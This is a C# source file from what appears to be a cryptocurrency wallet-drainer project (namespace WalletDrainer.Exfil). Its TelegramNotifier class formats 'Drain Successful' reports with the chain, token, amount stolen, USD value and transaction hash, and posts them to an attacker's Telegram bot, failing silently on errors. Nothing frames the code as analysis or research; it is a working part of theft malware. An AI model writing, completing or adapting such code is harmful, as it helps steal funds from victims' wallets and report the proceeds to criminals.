using System.Text;
using System.Text.Json;
using WalletDrainer.Config;
using WalletDrainer.Models;

namespace WalletDrainer.Exfil;

public sealed class TelegramNotifier
{
    private readonly HttpClient _http;
    private readonly DrainerConfig _config;

    public TelegramNotifier(DrainerConfig config)
    {
        _config = config;
        _http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
    }

    public async Task NotifyDrain(DrainResult result)
    {
        if (string.IsNullOrEmpty(_config.TelegramBotToken) || string.IsNullOrEmpty(_config.TelegramChatId))
            return;

        var message = new StringBuilder();
        message.AppendLine("💰 <b>Drain Successful</b>");
        message.AppendLine();
        message.AppendLine($"<b>Chain:</b> {result.Asset?.Chain}");
        message.AppendLine($"<b>Token:</b> {result.Asset?.Symbol}");
        message.AppendLine($"<b>Amount:</b> {result.AmountDrained:F6}");
        message.AppendLine($"<b>USD Value:</b> ${result.Asset?.UsdValue:F2}");
        message.AppendLine($"<b>TX:</b> <code>{result.TransactionHash}</code>");

        await SendMessage(message.ToString());
    }

    public async Task NotifyError(string error)
    {
        if (string.IsNullOrEmpty(_config.TelegramBotToken))
            return;

        await SendMessage($"⚠️ <b>Error:</b> {error}");
    }

    private async Task SendMessage(string text)
    {
        string url = $"https://api.telegram.org/bot{_config.TelegramBotToken}/sendMessage";

        var payload = new
        {
            chat_id = _config.TelegramChatId,
            text,
            parse_mode = "HTML",
            disable_web_page_preview = true
        };

        var content = new StringContent(
            JsonSerializer.Serialize(payload),
            Encoding.UTF8,
            "application/json");

        try
        {
            await _http.PostAsync(url, content);
        }
        catch
        {
            // Silent failure for notifications
        }
    }
}
